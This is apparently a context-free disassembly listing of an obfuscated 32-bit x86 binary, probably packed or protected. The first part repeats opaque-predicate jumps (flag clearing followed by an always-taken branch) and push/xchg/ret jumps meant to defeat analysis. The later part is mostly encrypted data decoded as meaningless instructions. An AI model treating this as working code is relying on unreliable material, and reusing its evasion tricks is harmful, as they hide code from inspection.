  40f526:	or     BYTE PTR [ebx*1+0x7d9f4bb5],dl
  40f52d:	or     BYTE PTR [esi-0x4b],bh
  40f530:	mov    esi,0xbd7cb5b5
  40f535:	push   ebp
  40f536:	add    al,0xb
  40f538:	add    BYTE PTR [eax],al
  40f53a:	std    
  40f53b:	in     eax,0x5b
  40f53d:	add    ecx,DWORD PTR [ecx+0x3c]
  40f540:	pushf  
  40f541:	and    WORD PTR [esp],0xfe
  40f547:	popf   
  40f548:	jae    0x40f10e
  40f54e:	dec    edx
  40f54f:	push   ebx
  40f550:	mov    ch,0x2e
  40f552:	pop    ecx
  40f553:	adc    al,0xb5
  40f555:	addr16 cs dec edx
  40f558:	scas   al,BYTE PTR es:[edi]
  40f559:	inc    ecx
  40f55a:	or     BYTE PTR [edx+ebx*4-0x7d],dh
  40f55e:	les    ebp,FWORD PTR [eax+edx*4]
  40f561:	cs jmp 0x40d014
  40f567:	addr16 mov ch,0xb5
  40f56a:	pop    ecx
  40f56b:	ins    DWORD PTR es:[edi],dx
  40f56c:	adc    BYTE PTR [ebp+0x67be5314],dh
  40f572:	fidivr WORD PTR [esi+0x10]
  40f575:	or     BYTE PTR [eax],cl
  40f577:	mov    ch,0xb5
  40f579:	and    DWORD PTR [esi],ebp
  40f57b:	int3   
  40f57c:	push   ebx
  40f57d:	add    BYTE PTR [eax],al
  40f57f:	lock stc 
  40f581:	xchg   ebp,eax
  40f582:	xlat   BYTE PTR ds:[ebx]
  40f583:	pop    ecx
  40f584:	pushf  
  40f585:	and    WORD PTR [esp],0xfe
  40f58b:	popf   
  40f58c:	jae    0x40da1b
  40f592:	or     BYTE PTR [edi-0x4151b44b],bl
  40f598:	sub    al,0x2c
  40f59a:	pop    ecx
  40f59b:	cs addr16 pop ecx
  40f59e:	scas   al,BYTE PTR es:[edi]
  40f59f:	mov    ch,0x84
  40f5a1:	mov    edx,0x669cd08b
  40f5a6:	and    DWORD PTR [esp],0xf9d00fe
  40f5ad:	cmp    edi,0xffffffb7
  40f5b0:	(bad)  
  40f5b1:	push   DWORD PTR [ebp-0x394a81ec]
  40f5b7:	jle    0x40f5e7
  40f5b9:	or     BYTE PTR [ebx+ecx*2-0x71],bh
  40f5bd:	push   ebx
  40f5be:	mov    ch,0xb5
  40f5c0:	sahf   
  40f5c1:	imul   ecx,eax
  40f5c4:	pushf  
  40f5c5:	and    WORD PTR [esp],0xfe
  40f5cb:	popf   
  40f5cc:	jae    0x40df20
  40f5d2:	adc    cl,ah
  40f5d4:	mov    al,ds:0xb5b559e1
  40f5d9:	mov    ch,0xde
  40f5db:	add    BYTE PTR [ecx+0x8],0x53
  40f5df:	(bad)  
  40f5e0:	call   DWORD PTR [ebp+0xc]
  40f5e3:	pushf  
  40f5e4:	and    WORD PTR [esp],0xfe
  40f5ea:	popf   
  40f5eb:	jae    0x40a599
  40f5f1:	dec    edx
  40f5f2:	loope  0x40f635
  40f5f4:	(bad)  
  40f5f5:	push   ebx
  40f5f6:	mov    ch,0x8f
  40f5f8:	jge    0x40f5cb
  40f5fa:	adc    BYTE PTR [ebp-0x3e21394b],dh
  40f600:	enter  0x5610,0x2e
  40f604:	ds es mov esi,0x40cd16
  40f60b:	nop
  40f60c:	xchg   DWORD PTR [esp],esi
  40f60f:	ds ret 0x0
  40f613:	or     BYTE PTR [ecx-0x7c],bl
  40f616:	loope  0x40f5cd
  40f618:	mov    ch,0x21
  40f61a:	adc    al,0x8
  40f61c:	inc    ecx
  40f61d:	sbb    DWORD PTR [edx-0x64],0x66
  40f621:	and    DWORD PTR [esp],0xf9d00fe
  40f628:	adc    DWORD PTR [edi+0x1],0x0
  40f62c:	add    BYTE PTR [ebx+0x59],cl
  40f62f:	sub    al,0xfc
  40f631:	ins    DWORD PTR es:[edi],dx
  40f632:	test   BYTE PTR cs:[di+0x8b5],dh
  40f638:	mov    al,ds:0xb367847c
  40f63d:	pusha  
  40f63e:	ds es jmp 0x40baa6
  40f645:	sub    al,0xb5
  40f647:	rcr    esi,1
  40f649:	and    DWORD PTR [esi+0x2eb567de],edi
  40f64f:	mov    BYTE PTR [edx-0x2e41e260],0x7e
  40f656:	sbb    BYTE PTR ds:0xb19f1010,0x2d
  40f65d:	jecxz  0x40f5e8
  40f65f:	jge    0x40f689
  40f661:	pushf  
  40f662:	and    WORD PTR [esp],0xfe
  40f668:	popf   
  40f669:	jae    0x40e713
  40f66f:	or     BYTE PTR [ebp-0x70922e4b],dh
  40f675:	mov    ch,0xb5
  40f677:	test   ah,bh
  40f679:	adc    al,0x59
  40f67b:	scas   al,BYTE PTR es:[edi]
  40f67c:	push   ebp
  40f67d:	mov    edi,0xcccccc
	...
  40f69a:	add    BYTE PTR [eax],al
  40f69c:	xor    DWORD PTR [edx],esi
  40f69e:	add    eax,DWORD PTR [ecx+0x1227]
  40f6a4:	push   ecx
  40f6a5:	es ss ss mov ecx,0x40a9e9
  40f6ad:	xchg   DWORD PTR es:[esp],ecx
  40f6b1:	ds ret 0x0
  40f6b5:	sbb    eax,0x4a1d7c82
  40f6ba:	mov    ch,0x41
  40f6bc:	add    BYTE PTR [ebx],0xcb
  40f6bf:	ss ss jmp 0x40c117
  40f6c6:	mov    ch,0xfc
  40f6c8:	mov    ch,0xb5
  40f6ca:	mov    ch,0xe1
  40f6cc:	mov    ch,0xb5
  40f6ce:	jle    0x40f685
  40f6d0:	mov    esi,0xb5b58fbe
  40f6d5:	or     BYTE PTR [esp+ebp*1-0x4b],bh
  40f6d9:	jl     0x40f758
  40f6db:	mov    eax,0x8579f8ec
  40f6e0:	pop    edx
  40f6e1:	test   ecx,ecx
  40f6e3:	cld    
  40f6e4:	repz jmp 0x40a31e
  40f6ea:	xor    BYTE PTR [ebp+0x6d087e08],0x84
  40f6f1:	adc    al,0x21
  40f6f3:	fdivp  st(4),st
  40f6f5:	inc    ecx
  40f6f6:	scas   al,BYTE PTR es:[edi]
  40f6f7:	pop    ecx
  40f6f8:	cld    
  40f6f9:	loope  0x40f6c1
  40f6fb:	addr16 sub al,0xd1
  40f6fe:	loope  0x40f774
  40f700:	add    BYTE PTR [eax+eax*1-0x7e18ef00],cl
  40f707:	(bad)  
  40f708:	dec    eax
  40f709:	pop    ds
  40f70a:	add    BYTE PTR [eax],al
  40f70c:	pushf  
  40f70d:	and    WORD PTR [esp],0xfe
  40f713:	popf   
  40f714:	jae    0x40e692
  40f71a:	lahf   
  40f71b:	scas   al,BYTE PTR es:[edi]
  40f71c:	pop    ecx
  40f71d:	and    DWORD PTR [ecx],esp
  40f71f:	adc    al,0x7d
  40f721:	dec    ebx
  40f722:	push   ebx
  40f723:	dec    ebx
  40f724:	ja     0x40f6b1
  40f726:	enter  0x669c,0x81
  40f72a:	and    al,0x24
  40f72c:	inc    BYTE PTR [eax]
  40f72e:	popf   
  40f72f:	jae    0x40eea2
  40f735:	(bad)  
  40f736:	addr16 cs dec ebx
  40f739:	mov    esi,0xb5219f21
  40f73e:	or     cl,ah
  40f740:	or     BYTE PTR [ecx],ah
  40f742:	cld    
  40f743:	fcmove st,st(4)
  40f745:	int3   
  40f746:	int3   
	...
  40f75f:	add    BYTE PTR [eax],al
  40f761:	add    ch,ah
  40f763:	test   DWORD PTR [edi],edi
  40f765:	mov    eax,DWORD PTR [edi+eax*4]
  40f768:	push   ecx
  40f769:	ss ss repz mov ecx,0x40ad0c
  40f771:	xchg   DWORD PTR es:[esp],ecx
  40f775:	ds ret 0x0
  40f779:	and    DWORD PTR [ecx+0x4a],eax
  40f77c:	mov    esi,0xae21e11d
  40f781:	adc    al,0x9f
  40f783:	dec    ebx
  40f784:	push   eax
  40f785:	pushf  
  40f786:	and    WORD PTR [esp],0xfe
  40f78c:	popf   
  40f78d:	jae    0x40a8c4
  40f793:	sbb    eax,0xe1b5b54b
  40f798:	shl    DWORD PTR cs:[ecx],1
  40f79b:	mov    ch,0x21
  40f79d:	mov    esi,0x102eb57e
  40f7a2:	cmp    BYTE PTR [ecx+0x52],bh
  40f7a5:	mov    ecx,DWORD PTR [ecx+0x38]
  40f7a8:	pushf  
  40f7a9:	and    WORD PTR [esp],0xfe
  40f7af:	popf   
  40f7b0:	jae    0x40d383
  40f7b6:	mov    ch,0x67
  40f7b8:	push   ebx
  40f7b9:	jl     0x40f770
  40f7bb:	dec    edx
  40f7bc:	adc    ah,bh
  40f7be:	shl    DWORD PTR cs:[di-0x2c7c],1
  40f7c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c6:	bnd ss jmp 0x40c9d6
  40f7cd:	(bad)  
  40f7ce:	cs (bad) 
  40f7d0:	push   ebx
  40f7d1:	lahf   
  40f7d2:	adc    cl,0x84
  40f7d5:	adc    BYTE PTR [ebp-0x4a0381d4],dh
  40f7db:	cld    
  40f7dc:	and    BYTE PTR [ecx],0x6d
  40f7df:	loope  0x40f7f5
  40f7e1:	mov    ch,0x3d
  40f7e3:	or     eax,0xc6832a99
  40f7e8:	add    al,0x26
  40f7ea:	ds jmp 0x40d95c
  40f7f0:	ins    DWORD PTR es:[edi],dx
  40f7f1:	push   ebx
  40f7f2:	mov    esi,0x2c67dee1
  40f7f7:	shl    DWORD PTR [ecx],1
  40f7f9:	loope  0x40f862
  40f7fb:	mov    ch,0x67
  40f7fd:	mov    ch,0xe1
  40f7ff:	inc    ecx
  40f800:	xor    BYTE PTR cs:[ebp-0x2f74b5df],0x9c
  40f808:	and    WORD PTR [esp],0xfe
  40f80e:	popf   
  40f80f:	jae    0x40c7f9
  40f815:	sub    al,0xae
  40f817:	sub    al,0x1d
  40f819:	mov    esi,0xb582c621
  40f81e:	and    DWORD PTR [edi+ebx*4+0x1aa47cb5],eax
  40f825:	int3   
  40f826:	int3   
  40f827:	int3   
	...
  40f840:	add    BYTE PTR [eax],al
  40f842:	add    BYTE PTR [edx+0xcccccc],al
	...
  40f860:	add    BYTE PTR [eax],al
  40f862:	inc    edx
  40f863:	aaa    
  40f864:	fcomp  QWORD PTR [esp+ebx*4-0x33]
  40f868:	or     bh,BYTE PTR [edi]
  40f86a:	retf   
  40f86b:	and    al,0x75
  40f86d:	xor    eax,0xdfee2ee1
  40f872:	cmp    BYTE PTR [eax-0x4fffff31],cl
  40f878:	ins    BYTE PTR es:[edi],dx
  40f879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f87a:	nop
  40f87b:	call   0x326a2ca
  40f880:	out    0x89,al
  40f882:	sti    
  40f883:	repz and ebx,eax
  40f886:	mov    ah,0xb8
  40f888:	pop    ebp
  40f889:	mov    bh,0x1f
  40f88b:	mov    dl,BYTE PTR [edx]
  40f88d:	into   
  40f88e:	inc    ecx
  40f88f:	mov    esi,0x30c43e83
  40f894:	add    BYTE PTR [eax],al
  40f896:	cmp    BYTE PTR [edi],bl
  40f898:	int    0x28
  40f89a:	daa    
  40f89b:	sub    al,0xe8
  40f89d:	push   esi
  40f89e:	dec    edi
  40f89f:	mov    eax,0xb8b2f3b3
  40f8a4:	push   ss
  40f8a5:	add    al,0x2c
  40f8a7:	add    BYTE PTR [eax],al
  40f8a9:	repnz (bad) 
  40f8ab:	and    eax,0x8984
  40f8b0:	and    eax,0x499ccbe7
  40f8b5:	sbb    dl,ah
  40f8b7:	call   0x21764b83
  40f8bc:	and    al,0xe1
  40f8be:	mov    eax,ds:0xb688
  40f8c3:	pop    ebx
  40f8c4:	sti    
  40f8c5:	fs push esp
  40f8c7:	iret   
  40f8c8:	fcom   st(5)
  40f8ca:	(bad)  
  40f8cb:	fild   WORD PTR [edx]
  40f8cd:	jns    0x40f8be
  40f8cf:	inc    eax
  40f8d0:	cmp    eax,DWORD PTR [eax]
  40f8d2:	add    ah,ch
  40f8d4:	pop    esi
  40f8d5:	popa   
  40f8d6:	iret   
  40f8d7:	in     al,0x1b
  40f8d9:	jge    0x40f90b
  40f8db:	into   
  40f8dc:	adc    eax,0x1ab11bb1
  40f8e1:	clc    
  40f8e2:	xor    DWORD PTR [ecx],edi
  40f8e4:	ror    BYTE PTR [ebp+0xc],1
  40f8e7:	retf   0x0
  40f8ea:	mov    cs,WORD PTR [ebp+0x3f08ae]
  40f8f0:	add    BYTE PTR [esi],bl
  40f8f2:	mov    al,0x6d
  40f8f4:	cmp    esp,DWORD PTR [ecx-0x4f]
  40f8f7:	gs je  0x40f976
  40f8fa:	arpl   cx,dx
  40f8fc:	loope  0x40f8e1
  40f8fe:	dec    esp
  40f8ff:	lahf   
  40f900:	add    BYTE PTR [eax],al
  40f902:	sub    esp,ebp
  40f904:	pop    esp
  40f905:	adc    cl,BYTE PTR [ebx-0x1]
  40f908:	(bad)  
  40f909:	sub    al,0x92
  40f90b:	inc    edi
  40f90c:	xchg   DWORD PTR [esi-0x70],ecx
  40f90f:	cmp    DWORD PTR [ebx-0x63],ebx
  40f912:	and    ebx,DWORD PTR [eax+0x5f]
  40f915:	jns    0x40f8f9
  40f917:	fstp   DWORD PTR [ebx]
  40f919:	ja     0x40f936
  40f91b:	dec    ebp
  40f91c:	xchg   BYTE PTR [ebx],dl
  40f91e:	cmp    edi,DWORD PTR [ecx+0x6a06d3aa]
  40f924:	stos   DWORD PTR es:[edi],eax
  40f925:	stos   DWORD PTR es:[edi],eax
  40f926:	pop    edi
  40f927:	jno    0x40f97e
  40f929:	shr    DWORD PTR [eax+0x374b1471],cl
  40f92f:	mov    cl,0x9b
  40f931:	movaps xmm1,XMMWORD PTR [esi]
  40f934:	dec    edi
  40f935:	jbe    0x40f915
  40f937:	sti    
  40f938:	rsqrtps xmm4,xmm7
  40f93b:	fidiv  DWORD PTR [esi+edi*2]
  40f93e:	pop    ebx
  40f93f:	es or  edx,ecx
  40f942:	stos   BYTE PTR es:[edi],al
  40f943:	fild   QWORD PTR [edx]
  40f945:	int3   
  40f946:	fild   DWORD PTR [eax]
  40f948:	add    ch,bl
  40f94a:	mov    eax,ds:0x9afba0e6
  40f94f:	pop    esp
  40f950:	and    al,0x63
  40f952:	repnz and esp,DWORD PTR [ebx]
  40f955:	inc    ebp
  40f956:	cmp    ecx,ecx
  40f958:	or     DWORD PTR [esi-0x7035d1d8],ecx
  40f95e:	cdq    
  40f95f:	sub    al,ch
  40f961:	sti    
  40f962:	ficom  DWORD PTR [eax]
  40f964:	mov    WORD PTR [eax],?
  40f966:	add    BYTE PTR [eax],al
  40f968:	cmovge edx,ecx
  40f96b:	sbb    ah,dh
  40f96d:	pop    ds
  40f96e:	sbb    bl,bl
  40f970:	repnz push cs
  40f972:	adc    ah,0x0
  40f975:	add    BYTE PTR [eax-0x2f],dl
  40f978:	push   fs
  40f97a:	push   es
  40f97b:	lods   al,BYTE PTR ds:[esi]
  40f97c:	scas   eax,DWORD PTR es:[edi]
  40f97d:	das    
  40f97e:	push   esp
  40f97f:	cs sub al,0x78
  40f982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f983:	test   BYTE PTR [esi+0x0],dl
  40f986:	add    BYTE PTR [ebx-0x2a],bl
  40f989:	inc    eax
  40f98a:	mov    dh,0x0
  40f98c:	add    BYTE PTR [ecx],bl
  40f98e:	fadd   QWORD PTR [ebx]
  40f990:	fmulp  st(1),st
  40f992:	mov    ebp,ebp
  40f994:	mov    al,0xea
  40f996:	scas   eax,DWORD PTR es:[edi]
  40f997:	mov    edx,0x4483a9e3
  40f99c:	xor    eax,0x5b4c0000
  40f9a1:	add    BYTE PTR [eax],al
  40f9a3:	cmp    al,BYTE PTR [eax]
  40f9a5:	test   DWORD PTR [eax],eax
  40f9a7:	add    BYTE PTR [edx],ch
  40f9a9:	and    ah,ch
  40f9ab:	js     0x40f9eb
  40f9ad:	loope  0x40f9ba
  40f9af:	ror    BYTE PTR [ebx-0x4e],cl
  40f9b2:	push   edx
  40f9b3:	fwait
  40f9b4:	adc    dh,al
  40f9b6:	in     al,0x13
  40f9b8:	inc    edi
  40f9b9:	es lahf 
  40f9bb:	nop
  40f9bc:	dec    ebp
  40f9bd:	jmp    0x40f9a2
  40f9bf:	mov    esi,fs
  40f9c1:	add    BYTE PTR [eax],al
  40f9c3:	push   edx
  40f9c4:	add    BYTE PTR [bx+di+0x0],ch
  40f9c8:	add    BYTE PTR [ecx+0x34d2208b],cl
  40f9ce:	out    0x71,al
  40f9d0:	sub    bh,BYTE PTR [eax+0x50]
  40f9d3:	mov    ecx,0x1962eba6
  40f9d8:	cli    
  40f9d9:	mov    al,0xbc
  40f9db:	leave  
  40f9dc:	jmp    0x8930edb1
  40f9e1:	repz add BYTE PTR [eax],al
  40f9e4:	ret    0xc01a
  40f9e7:	ret    0x0
  40f9ea:	push   esp
  40f9eb:	ss mov eax,edx
  40f9ee:	xchg   ecx,eax
  40f9ef:	add    cl,BYTE PTR [esp+esi*4]
  40f9f2:	add    BYTE PTR [eax],al
  40f9f4:	jmp    0x49:0xccf17562
  40f9fb:	add    BYTE PTR [eax+eax*1+0x22],ah
  40f9ff:	add    BYTE PTR [eax],al
  40fa01:	cmc    
  40fa02:	nop
  40fa03:	adc    esi,DWORD PTR [esi+0x54]
  40fa06:	or     al,0xda
  40fa08:	add    BYTE PTR [eax],al
  40fa0a:	or     BYTE PTR [edi+0x72850000],dl
  40fa10:	dec    eax
  40fa11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa12:	add    BYTE PTR [eax],al
  40fa14:	call   0x3f35:0x312f64e6
  40fa1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa1c:	sub    al,bl
  40fa1e:	add    esi,ecx
  40fa20:	loope  0x40f9ce
  40fa22:	jge    0x40f9b8
  40fa24:	imul   ecx,DWORD PTR [ecx+0x6e40a572],0x902a0000
  40fa2e:	dec    ecx
  40fa2f:	jne    0x40fa24
  40fa31:	sti    
  40fa32:	push   ebx
  40fa33:	xchg   ebp,eax
  40fa34:	xchg   ebp,eax
  40fa35:	add    al,0x5b
  40fa38:	add    BYTE PTR [eax],al
  40fa3a:	dec    ebx
  40fa3b:	adc    cl,BYTE PTR [edi+ebp*2-0x77af0000]
  40fa42:	push   ebx
  40fa43:	add    BYTE PTR [eax],al
  40fa45:	inc    edi
  40fa46:	std    
  40fa47:	and    al,0xce
  40fa49:	mov    dh,0xc6
  40fa4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa4c:	aas    
  40fa4d:	(bad)  
  40fa4f:	ins    BYTE PTR es:[edi],dx
  40fa50:	ret    
  40fa51:	push   eax
  40fa52:	mov    cl,0xab
  40fa54:	pop    eax
  40fa55:	mov    ds:0x72fa8b2c,al
  40fa5a:	repz mov al,ds:0x400f10a3
  40fa60:	cmp    al,0x0
  40fa62:	add    BYTE PTR ds:0xfcc97912,al
  40fa68:	jle    0x40faa9
  40fa6a:	jge    0x40f9ee
  40fa6c:	das    
  40fa6d:	(bad)
  40fa70:	in     eax,dx
  40fa71:	inc    edx
  40fa72:	rdtsc  
  40fa74:	xchg   BYTE PTR [edi],bl
  40fa76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa77:	fst    QWORD PTR [ebp+0x2f5763c9]
  40fa7d:	or     al,BYTE PTR [ecx-0x1c]
  40fa80:	xchg   ecx,eax
  40fa81:	adc    dh,BYTE PTR ds:0xa5c13a25
  40fa87:	cdq    
  40fa88:	and    al,cl
  40fa8a:	add    BYTE PTR [bx+si],al
  40fa8d:	xlat   BYTE PTR ds:[ebx]
  40fa8e:	ins    BYTE PTR es:[edi],dx
  40fa8f:	in     al,0x56
  40fa91:	mov    eax,ds:0xfe0b6437
  40fa96:	xchg   ebp,eax
  40fa97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa98:	shr    BYTE PTR [eax-0x7f],cl
  40fa9b:	imul   DWORD PTR [edx-0x19]
  40fa9e:	sti    
  40fa9f:	in     eax,0xb4
  40faa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faa2:	retf   
  40faa3:	fidiv  WORD PTR [edi+0x78]
  40faa6:	pop    esp
  40faa7:	pop    es
  40faa8:	inc    ecx
  40faa9:	xor    DWORD PTR [eax+eax*1+0x530000fd],ebx
  40fab0:	push   0x43
  40fab2:	sahf   
  40fab3:	repnz iret 
  40fab5:	hlt    
  40fab6:	daa    
  40fab7:	es pop eax
  40fab9:	cli    
  40faba:	into   
  40fabb:	inc    ebp
  40fabc:	push   eax
  40fabd:	add    eax,0xd8402
  40fac2:	add    BYTE PTR [esi+ebp*4+0x1e3a1824],bh
  40fac9:	xchg   edx,eax
  40faca:	jmp    0x40fb19
  40facc:	jg     0x40fab5
  40face:	mov    ecx,0xee44
  40fad3:	aam    0xe0
  40fad5:	xchg   ebp,eax
  40fad6:	lods   al,BYTE PTR ds:[esi]
  40fad7:	call   0xf37fcba6
  40fadc:	jg     0x40faac
  40fade:	(bad)  [edx+0x7]
  40fae1:	(bad)  
  40fae2:	std    
  40fae3:	rcl    BYTE PTR [ecx+0xa],cl
  40fae6:	mov    esi,0x106572e9
  40faeb:	push   ebx
  40faec:	mov    WORD PTR [edi+0x64730000],?
  40faf2:	dec    edx
  40faf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faf4:	mov    eax,0xa68c5eed
  40faf9:	add    BYTE PTR [eax],al
  40fafb:	pop    ds
  40fafc:	jne    0x40fa82
  40fafe:	scas   eax,DWORD PTR es:[edi]
  40faff:	add    BYTE PTR [eax],al
  40fb01:	sub    eax,edx
  40fb03:	imul   edi,DWORD PTR [ebx-0x20a146ed],0x26
  40fb0a:	loopne 0x40fb72
  40fb0c:	jns    0x40fb6e
  40fb0e:	mov    esp,0xc53f6c35
  40fb13:	mov    al,0x83
  40fb15:	pop    esi
  40fb16:	test   BYTE PTR [edi],dh
  40fb18:	add    BYTE PTR [eax],al
  40fb1a:	imul   ecx,DWORD PTR [ebx-0x22854e8d],0xffffff80
  40fb21:	in     eax,dx
  40fb22:	add    BYTE PTR [eax],al
  40fb24:	push   edx
  40fb25:	dec    edi
  40fb26:	aaa    
  40fb27:	call   0x9a4b:0x6908
  40fb2e:	sbb    DWORD PTR [ebp+ecx*2+0x6c],0x47
  40fb33:	jle    0x40fb28
  40fb35:	test   ebp,ebx
  40fb37:	imul   esi,DWORD PTR [ebx+0x958c95],0x0
  40fb3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb3f:	fnstenv [eax+edx*8+0x1]
  40fb43:	mov    edi,0x11904fc3
  40fb48:	dec    edx
  40fb49:	ret    0xfe95
  40fb4c:	push   esi
  40fb4d:	jl     0x40fad3
  40fb4f:	rol    BYTE PTR [eax],0x0
  40fb52:	mov    ds,WORD PTR [edx]
  40fb54:	xor    al,0x2d
  40fb56:	or     DWORD PTR [edi+0x6cbea815],edi
  40fb5c:	xchg   ecx,eax
  40fb5d:	cli    
  40fb5e:	bound  eax,QWORD PTR [ebx]
  40fb60:	dec    esi
  40fb61:	push   eax
  40fb62:	repz stc 
  40fb64:	mov    bh,0x23
  40fb66:	mov    dl,0xe6
  40fb68:	mov    esi,0x1a1ef01
  40fb6d:	pop    edi
  40fb6e:	cmp    DWORD PTR [esi+esi*4-0x9f9182],0x3a2e12cf
  40fb79:	mov    bh,0x52
  40fb7b:	loope  0x40fb69
  40fb7d:	imul   edi,edi,0xf254352f
  40fb83:	iret   
  40fb84:	pop    ebp
  40fb85:	sar    BYTE PTR [ebx-0x2da450be],1
  40fb8b:	pop    eax
  40fb8c:	in     al,dx
  40fb8d:	popa   
  40fb8e:	stos   BYTE PTR es:[edi],al
  40fb8f:	cld    
  40fb90:	lea    edi,[edi]
  40fb92:	cmp    edi,0xcf159feb
  40fb98:	adc    edx,DWORD PTR [edx]
  40fb9a:	es stc 
  40fb9c:	mov    al,ds:0xd8dadd98
  40fba1:	in     eax,0x72
  40fba3:	push   ds
  40fba4:	sti    
  40fba5:	inc    ebp
  40fba6:	push   0xffffff93
  40fba8:	fstp   DWORD PTR [edx+0x77]
  40fbab:	in     eax,0x88
  40fbad:	push   ds
  40fbae:	add    BYTE PTR [eax],al
  40fbb0:	xor    edi,DWORD PTR [ebx+0x1cc889]
  40fbb6:	add    BYTE PTR [ebx+eax*2],dl
  40fbb9:	sub    eax,DWORD PTR [ebx]
  40fbbb:	mov    WORD PTR [eax+0x0],ss
  40fbbe:	add    ah,ch
  40fbc0:	fwait
  40fbc1:	rol    BYTE PTR [ecx],0x0
  40fbc4:	add    BYTE PTR [ecx-0x4e],al
  40fbc7:	add    DWORD PTR [eax+0x1d00009f],0x66
  40fbce:	sub    eax,0xafefae57
  40fbd3:	mov    ebp,0xc6a5a056
  40fbd8:	mov    bl,0xe2
  40fbda:	(bad)  
  40fbdb:	out    dx,al
  40fbdc:	add    BYTE PTR [eax],al
  40fbde:	mov    al,ds:0x4a8f1551
  40fbe3:	inc    edx
  40fbe4:	neg    DWORD PTR [ebx]
  40fbe6:	das    
  40fbe7:	lahf   
  40fbe8:	xchg   ecx,eax
  40fbe9:	and    DWORD PTR [edx+0x186a32ea],ecx
  40fbef:	jmp    0xa0334b96
  40fbf4:	mov    BYTE PTR [ebx-0x31850000],cl
  40fbfa:	gs and ebx,edx
  40fbfd:	pop    ebx
  40fbfe:	jmp    0x40fc17
  40fc00:	iret   
  40fc01:	pop    edi
  40fc02:	jnp    0x40fb8f
  40fc04:	xchg   esi,eax
  40fc05:	mov    bl,0x41
  40fc07:	or     DWORD PTR [edi+0x2e],ebx
  40fc0a:	cmp    BYTE PTR [esp+edi*2],dl
  40fc0d:	icebp  
  40fc0e:	xchg   esp,eax
  40fc0f:	mov    ah,0x1f
  40fc11:	push   ecx
  40fc12:	jmp    0xd9f76f30
  40fc17:	cmp    edi,0xffffffab
  40fc1a:	mov    BYTE PTR [eax+0x0],bl
  40fc1d:	add    BYTE PTR [esi+ecx*1+0x0],cl
  40fc21:	add    BYTE PTR [eax-0x4a9de0d0],dh
  40fc27:	je     0x40fc6f
  40fc29:	sbb    BYTE PTR [edi],al
  40fc2b:	xor    BYTE PTR [eax-0x33],bl
  40fc2e:	pop    ecx
  40fc2f:	xor    BYTE PTR [ecx+0x4f],bh
  40fc32:	mov    ebp,0x6fea161f
  40fc37:	out    0xcd,al
  40fc39:	xor    BYTE PTR [ebx+0x1900],0x18
  40fc40:	sub    BYTE PTR [edx],ch
  40fc42:	pop    ebp
  40fc43:	push   ebx
  40fc44:	mov    bl,0xe
  40fc46:	push   0x529fd5ce
  40fc4b:	je     0x40fc97
  40fc4d:	jge    0x40fc0f
  40fc4f:	cmp    eax,0x6e0c0000
  40fc54:	add    BYTE PTR [eax],al
  40fc56:	(bad)  
  40fc57:	mov    WORD PTR [eax+eax*1+0x2d238100],fs
  40fc5e:	jne    0x40fbf1
  40fc60:	call   0xd67458c5
  40fc65:	imul   eax,DWORD PTR [eax-0x1a],0xdf8f0000
  40fc6c:	jo     0x40fc6d
  40fc6e:	sbb    esi,DWORD PTR [eax+ecx*2]
  40fc71:	adc    BYTE PTR [eax],al
  40fc73:	add    BYTE PTR [edi+0x11],ah
  40fc76:	fdivr  DWORD PTR [ebx+esi*4]
  40fc79:	sub    eax,0x982fec50
  40fc7e:	das    
  40fc7f:	cwde   
  40fc80:	sar    DWORD PTR [esi+0xca8c],cl
  40fc86:	call   0x16f1b9b8
  40fc8b:	push   esp
  40fc8c:	fbld   TBYTE PTR [ebp-0x4a]
  40fc8f:	sahf   
  40fc90:	lock mov bh,0x50
  40fc93:	jl     0x40fc23
  40fc95:	addr16 mov ds:0x1496,eax
  40fc99:	add    eax,0xb9803a
  40fc9e:	add    BYTE PTR ds:0xc2bb1a27,ah
  40fca4:	sbb    eax,ebp
  40fca6:	or     BYTE PTR [edi-0x80],0xe6
  40fcaa:	add    BYTE PTR [eax],al
  40fcac:	sbb    bh,BYTE PTR [ecx]
  40fcae:	sbb    al,0xd6
  40fcb0:	sub    DWORD PTR [ecx],esi
  40fcb2:	mov    ds:0xa0b6f33b,eax
  40fcb7:	push   esp
  40fcb8:	adc    edi,DWORD PTR [ebp+0x51]
  40fcbb:	fsub   QWORD PTR [ebx+0x10c0]
  40fcc1:	cli    
  40fcc2:	add    BYTE PTR [esi+0x4f430000],dh
  40fcc8:	clc    
  40fcc9:	inc    ebp
  40fcca:	test   eax,0x3aa1a1c7
  40fccf:	adc    al,0xc2
  40fcd2:	add    eax,0x49ff9c07
  40fcd7:	jecxz  0x40fc74
  40fcd9:	ret    
  40fcda:	out    dx,al
  40fcdb:	je     0x40fd00
  40fcdd:	and    eax,0xef8b8502
  40fce2:	fs aam 0xe3
  40fce5:	ss in  al,0x44
  40fce8:	cwde   
  40fce9:	add    BYTE PTR [eax],al
  40fceb:	sub    DWORD PTR es:[ebp-0x63],esi
  40fcef:	enter  0x6d,0x0
  40fcf3:	or     BYTE PTR [ebp+0x974c71],0x0
  40fcfa:	aam    0xf9
  40fcfc:	out    0xc4,eax
  40fcfe:	push   ecx
  40fcff:	add    BYTE PTR [eax],al
  40fd01:	and    al,BYTE PTR [edx-0x18]
  40fd04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd05:	xchg   DWORD PTR [edi+eiz*4-0x11],ebp
  40fd09:	mov    esi,DWORD PTR [ebp+0x5d]
  40fd0c:	(bad)  
  40fd0d:	retf   0xd537
  40fd10:	repnz in al,dx
  40fd12:	retf   
  40fd13:	and    ecx,DWORD PTR [edx-0x105080ae]
  40fd19:	fst    DWORD PTR [ecx+0x16]
  40fd1c:	xchg   edi,eax
  40fd1d:	inc    edi
  40fd1e:	push   ebx
  40fd1f:	stos   BYTE PTR es:[edi],al
  40fd20:	jbe    0x40fd71
  40fd22:	(bad)  
  40fd24:	sti    
  40fd25:	cs xchg esp,eax
  40fd27:	addr16 inc edx
